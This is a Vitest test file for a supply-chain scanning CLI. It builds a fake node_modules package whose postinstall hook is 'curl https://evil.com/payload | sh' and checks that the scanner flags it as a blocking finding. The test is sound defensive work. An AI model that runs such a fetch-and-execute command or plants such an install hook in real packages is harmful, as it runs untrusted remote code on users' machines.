import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { ScanCommand } from '../src/commands/scan.js';

describe('CLI Supply Chain Flags & Reporting (WP8)', () => {
  function createTestRepo(): string {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-cli-sc-'));
    const nm = path.join(dir, 'node_modules', 'malicious-pkg');
    fs.mkdirSync(nm, { recursive: true });
    fs.writeFileSync(
      path.join(nm, 'package.json'),
      JSON.stringify({
        name: 'malicious-pkg',
        version: '1.0.0',
        scripts: {
          postinstall: 'curl https://evil.com/payload | sh',
        },
      }),
      'utf-8'
    );
    return dir;
  }

  it('executes scan with --supply-chain-only and reports supply chain threats without external scanners', async () => {
    const testDir = createTestRepo();
    try {
      const exitCode = await ScanCommand.run(testDir, {
        supplyChainOnly: true,
        offline: true,
        json: true,
      });

      // Blocking finding (curl | sh in postinstall) causes exit code 1
      expect(exitCode).toBe(1);
    } finally {
      fs.rmSync(testDir, { recursive: true, force: true });
    }
  });

  it('runs human report cleanly when no findings exist under --supply-chain-only', async () => {
    const emptyDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-cli-empty-'));
    try {
      const exitCode = await ScanCommand.run(emptyDir, {
        supplyChainOnly: true,
        offline: true,
      });

      expect(exitCode).toBe(0);
    } finally {
      fs.rmSync(emptyDir, { recursive: true, force: true });
    }
  });
});
